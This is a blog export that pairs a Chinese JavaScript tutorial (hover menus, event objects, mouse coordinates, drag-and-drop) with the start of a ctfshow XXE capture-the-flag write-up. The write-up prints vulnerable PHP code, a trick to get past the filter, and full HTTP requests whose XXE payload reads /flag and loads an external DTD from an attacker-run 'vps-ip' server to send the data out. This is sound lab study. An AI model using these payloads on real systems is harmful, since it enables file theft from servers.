<h4 id="淘宝二级菜单样式设置"><a href="#淘宝二级菜单样式设置" class="headerlink" title="淘宝二级菜单样式设置"></a>淘宝二级菜单样式设置</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        *&#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.container</span>&#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">80%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">400px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">30px</span> auto;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border</span>:<span class="number">1px</span> solid black;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.container</span> <span class="selector-tag">div</span>&#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">float</span><span class="selector-pseudo">:left</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-id">#left</span>&#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">20%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-id">#right</span>&#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">79%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-left</span>: <span class="number">1px</span> solid black;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-id">#left</span> <span class="selector-tag">ul</span>&#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">list-style</span>: none;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-id">#left</span> <span class="selector-tag">ul</span> <span class="selector-tag">li</span>&#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">30px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">10px</span> <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;left&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span> 女装 <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span> 男装 <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span> 童装 <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span> 玩具 <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span> 用品 <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;right&quot;</span>&gt;</span></span><br><span class="line">        购买得物品</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 获取所有 li 节点</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> liarr=<span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;li&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> rt=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;right&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;liarr.<span class="property">length</span>;i++)&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="comment">// 为每一个 li 添加事件</span></span></span><br><span class="line"><span class="language-javascript">        +<span class="keyword">function</span>(<span class="params">index</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="comment">// 添加鼠标移上事件</span></span></span><br><span class="line"><span class="language-javascript">            liarr[index].<span class="property">onmouseenter</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">for</span>(<span class="keyword">var</span> j=<span class="number">0</span>;j&lt;liarr.<span class="property">length</span>;j++)&#123;</span></span><br><span class="line"><span class="language-javascript">                    liarr[j].<span class="property">style</span>.<span class="property">background</span>=<span class="string">&quot;white&quot;</span></span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">                liarr[index].<span class="property">style</span>.<span class="property">background</span>=<span class="string">&quot;pink&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">                rt.<span class="property">style</span>.<span class="property">display</span>=<span class="string">&quot;block&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">                rt.<span class="property">innerHTML</span>=<span class="string">&quot;购买得商品是&quot;</span>+index;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">			<span class="comment">// 鼠标以下事件</span></span></span><br><span class="line"><span class="language-javascript">            liarr[index].<span class="property">onmouseleave</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">for</span>(<span class="keyword">var</span> j=<span class="number">0</span>;j&lt;liarr.<span class="property">length</span>;j++)&#123;</span></span><br><span class="line"><span class="language-javascript">                    rt.<span class="property">style</span>.<span class="property">display</span>=<span class="string">&quot;none&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;(i)</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/04/11/vknmxM2VRuPzprH.png" alt="image-20240411231149809"></p>
<h3 id="事件对象"><a href="#事件对象" class="headerlink" title="事件对象"></a>事件对象</h3><h4 id="事件对象-1"><a href="#事件对象-1" class="headerlink" title="事件对象"></a>事件对象</h4><p>概述：任意节点树上得节点（标签）。都可以绑定一个或多个事件。当用户触发事件得时候，系统会自动给事件处理函数传递实参，而这个参数就是事件对象，可以传递很多信息。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 获取节点</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> div = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;div&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    div.<span class="property">onclick</span> = <span class="keyword">function</span>(<span class="params">event</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="comment">// 对于高级浏览器：谷歌、IE8 以上的浏览-&gt;event</span></span></span><br><span class="line"><span class="language-javascript">		<span class="comment">// 对于低级浏览器：IE8 以下的，事件对象作为 BOM 对象属性</span></span></span><br><span class="line"><span class="language-javascript">    	<span class="keyword">var</span> e = event||<span class="variable language_">window</span>.<span class="property">event</span>;</span></span><br><span class="line"><span class="language-javascript">    	<span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>当事件处理函数执行得时候，系统会自动注入实参，我们用形参接收即事件对象</p>
</li>
<li><p>在不同浏览器中事件对象是有兼容性问题得，使用短路语句进行兼容</p>
</li>
</ul>
<h4 id="获取鼠标位置"><a href="#获取鼠标位置" class="headerlink" title="获取鼠标位置"></a>获取鼠标位置</h4><p>概述：当用户触发时间的时候，系统会自动给事件处理函数注入实参，他可以给我们提供鼠标得位置信息，均是对象属性。</p>
<p>JavaScript 在处理浏览器中的事件时，经常会遇到几种不同的坐标系统：<code>screenX/screenY</code>、<code>pageX/pageY</code>、<code>clientX/clientY</code> 以及 <code>offsetX/offsetY</code>。这些坐标系统各自有不同的用途和应用场景。接下来我会详细解释每一种坐标系统的作用，并通过文字描述配合图示加以说明。</p>
<h5 id="screenX-和-screenY"><a href="#screenX-和-screenY" class="headerlink" title="screenX 和 screenY"></a><code>screenX</code> 和 <code>screenY</code></h5><p>概述：他们两者是事件对象属性，主要获取鼠标位置。获取鼠标位置 (0,0) 点在<strong>电脑屏幕左上角</strong>。表示鼠标相对于整个屏幕的位置。</p>
<p><code>screenX</code> 和 <code>screenY</code> 表示鼠标指针在用户屏幕上的位置，以屏幕的左上角为坐标原点 (0,0)。这意味着无论浏览器窗口在屏幕的什么位置，<code>screenX</code> 和 <code>screenY</code> 始终是相对于整个电脑屏幕的位置。</p>
<p>适用场景: 当你需要获取鼠标相对于整个显示屏幕的位置时使用，比如在多显示器设置中确定鼠标的确切位置。</p>
<p><img src="https://s2.loli.net/2024/04/12/L7oHvyeEYcsXJ98.png" alt="image-20240411235205611"></p>
<h5 id="pageX-和-pageY"><a href="#pageX-和-pageY" class="headerlink" title="pageX 和 pageY"></a><code>pageX</code> 和 <code>pageY</code></h5><p>概述：他们两者是事件对象属性，主要获取鼠标位置。获取鼠标位置 (0,0) 点在<strong>网页主题部分</strong>左上角。展示鼠标在浏览器视窗内的位置，不包括滚动的部分。</p>
<p><code>pageX</code> 和 <code>pageY</code> 表示鼠标指针相对于整个网页文档的位置，从文档的左上角开始计算。这意味着如果页面被滚动，<code>pageX</code> 和 <code>pageY</code> 会包括滚动的部分，即视图以上的部分。</p>
<p>适用场景: 适用于需要获取鼠标指针相对于整个页面的位置，特别是当页面出现滚动条时。</p>
<p><img src="https://s2.loli.net/2024/04/12/5DlK8Npv3yFqr7H.png" alt="image-20240411235207934"></p>
<h5 id="clientX-和-clientY"><a href="#clientX-和-clientY" class="headerlink" title="clientX 和 clientY"></a><code>clientX</code> 和 <code>clientY</code></h5><p>概述：他们两者是事件对象属性，主要获取鼠标位置。但他的 (0,0) 点是按照<strong>可视区域左上角</strong>为 (0,0) 点。指出鼠标相对于整个网页文档的位置，包含滚动的部分。</p>
<p><code>clientX</code> 和 <code>clientY</code> 表示鼠标指针相对于当前视口（即浏览器内容区域）的位置，不包括工具栏和滚动条。坐标原点在浏览器内容区域的左上角。</p>
<p>适用场景: 当你需要获取鼠标在浏览器可视区域（不包括滚动的部分）的位置时使用。这在计算元素在视口中的位置时非常有用。</p>
<p><img src="https://s2.loli.net/2024/04/12/QWqdfFZHsSp8lO3.png" alt="image-20240411235702269"></p>
<h5 id="offsetX-和-offsetY"><a href="#offsetX-和-offsetY" class="headerlink" title="offsetX 和 offsetY"></a><code>offsetX</code> 和 <code>offsetY</code></h5><p>概述：他们两者也是事件对象属性，他们两者主要的作用也是获取鼠标位置。显示鼠标相对于特定触发事件元素的位置。</p>
<p>获取数据类似 pageX 和 pageY 。但是这个获取数据 (0,0) 点会受到子元素坐标体系影响。</p>
<p><code>offsetX</code> 和 <code>offsetY</code> 表示鼠标指针相对于触发事件目标元素的位置，坐标原点是目标元素的左上角。</p>
<p>适用场景: 当你需要获取鼠标在一个特定元素内的相对位置时使用，这对于处理像是在一个具体元素上实现拖放等功能非常有用。</p>
<p><img src="https://s2.loli.net/2024/04/12/dpHh7ZjWq8CoAwa.png" alt="image-20240411235708408"></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        *&#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">body</span>&#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">10000px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.outer</span>&#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">position</span>: fixed;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">600px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background</span>: skyblue;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">left</span>: <span class="number">30%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">top</span>: <span class="number">30px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.inner</span>&#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">150px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background</span>: red;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>:<span class="number">20px</span> auto;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;outer&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;inner&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 获取节点</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> inn = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.inner&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 鼠标在整个网页当中移动</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">onmousemove</span> = <span class="keyword">function</span>(<span class="params">event</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="comment">// 短路语法进行兼容</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> e = event||<span class="variable language_">window</span>.<span class="property">event</span>;</span></span><br><span class="line"><span class="language-javascript">        inn.<span class="property">innerHTML</span> = <span class="string">&quot;screenX:&quot;</span>+ e.<span class="property">screenX</span> + <span class="string">&quot;screenY&quot;</span>+e.<span class="property">screenY</span>+<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        inn.<span class="property">innerHTML</span> += <span class="string">&quot;pageX:&quot;</span>+e.<span class="property">pageX</span> +<span class="string">&quot;pageY:&quot;</span>+e.<span class="property">pageY</span>+<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        inn.<span class="property">innerHTML</span> +=<span class="string">&quot;clientX&quot;</span>+e.<span class="property">clientX</span> +<span class="string">&quot;clinetY&quot;</span>+e.<span class="property">clientY</span>+<span class="string">&quot;&lt;br/ &gt;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        inn.<span class="property">innerHTML</span> +=<span class="string">&quot;offsetX&quot;</span>+e.<span class="property">offsetX</span> +<span class="string">&quot;offsetY&quot;</span>+e.<span class="property">offsetY</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="原生-JS-实现拖拽效果"><a href="#原生-JS-实现拖拽效果" class="headerlink" title="原生 JS 实现拖拽效果"></a>原生 JS 实现拖拽效果</h4><p>概述：在前端领域当中拖拽是一个非常常见效果。拖拽三板斧：鼠标按下&#x3D;&gt;鼠标移动&#x3D;&gt;鼠标抬起。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 移除事情</span></span><br><span class="line"><span class="keyword">var</span> div = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.cur&#x27;</span>);</span><br><span class="line"><span class="comment">// 鼠标按下</span></span><br><span class="line">div.<span class="property">onmousedown</span> = <span class="keyword">function</span>(<span class="params">event</span>)&#123;</span><br><span class="line">	<span class="comment">// 短路语法兼容事件对象</span></span><br><span class="line">    <span class="keyword">var</span> e = event||<span class="variable language_">window</span>.<span class="property">event</span>;</span><br><span class="line">	<span class="comment">// 获取鼠标距离元素左侧顶部数据</span></span><br><span class="line">    <span class="keyword">var</span> startX = e.<span class="property">offsetX</span>;</span><br><span class="line">    <span class="keyword">var</span> startY = e.<span class="property">offsetY</span>;</span><br><span class="line">	<span class="comment">// 鼠标在整个网页中移动</span></span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">onmousemove</span> = <span class="keyword">function</span>(<span class="params">event1</span>)&#123;</span><br><span class="line">	<span class="comment">// 短路语法兼容事件对象</span></span><br><span class="line">        <span class="keyword">var</span> e1 = event1||<span class="variable language_">window</span>.<span class="property">event</span>;</span><br><span class="line">		<span class="comment">// 元素进行拖拽</span></span><br><span class="line">        div.<span class="property">style</span>.<span class="property">left</span> = e1.<span class="property">clientX</span> - startX +<span class="string">&quot;px&quot;</span>;</span><br><span class="line">        div.<span class="property">style</span>.<span class="property">top</span> = e1.<span class="property">clientY</span> - startY +<span class="string">&quot;px&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 鼠标抬起事情--将鼠标移动事件移除</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">onmouseup</span> =<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">onmousemove</span> = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>可以将元素事件移除：就是给这个元素绑定多次事件。让后者覆盖前者。</li>
</ul>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow XXE 刷题记录</title>
    <url>/2024/04/02/ctfshow%20XEE%20%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1 id="web373-web374"><a href="#web373-web374" class="headerlink" title="web373-web374"></a>web373-web374</h1><p>传送门：</p>
<p><a href="https://ed3n.top/2024/03/11/XXE%E6%BC%8F%E6%B4%9E/">XXE学习记录 | Ed3n’s Blog</a></p>
<h1 id="web375"><a href="#web375" class="headerlink" title="web375"></a>web375</h1><p>先看源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-07 12:59:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-07 15:22:05</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;/&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);    </span><br></pre></td></tr></table></figure>

<p>与上题的区别是多了如下代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;/&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>相当于是不能出现 <code>&lt;?xml version=&quot;1.0&quot;</code> </p>
<h2 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h2><p>不要不就好了？web374 的做法也没有加 <code>&lt;?xml  version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</code>。那就和 web374 做法一致就行</p>
<h2 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h2><p>在<code>&lt;?xml version=&quot;1.0&quot;</code>中的空格后加个换行符，发包内容为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: b9bd31cd-52ff-4eb0-b2b2-9ae0b6528086.challenge.ctf.show</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 212</span><br><span class="line"></span><br><span class="line">&lt;?xml </span><br><span class="line"> version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://vps-ip:8000/XXE.dtd&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<p>成功接收到 flag</p>
<p><img src="https://s2.loli.net/2024/03/27/6jUB9ZCleKzR1FH.png" alt="image-20240327172210794"></p>
<h2 id="方法三："><a href="#方法三：" class="headerlink" title="方法三："></a>方法三：</h2><p>在<code>&lt;?xml version=&quot;1.0&quot;</code>中的空格后再加个空格，发包内容为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: b9bd31cd-52ff-4eb0-b2b2-9ae0b6528086.challenge.ctf.show</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 212</span><br><span class="line"></span><br><span class="line">&lt;?xml  version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://vps-ip:8000/XXE.dtd&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<p>成功接收到 flag</p>
<p><img src="https://s2.loli.net/2024/03/27/Lb2ykmlj4vscCDg.png" alt="image-20240327173015025"></p>
<h1 id="web376"><a href="#web376" class="headerlink" title="web376"></a>web376</h1><p>先看源码：</p>
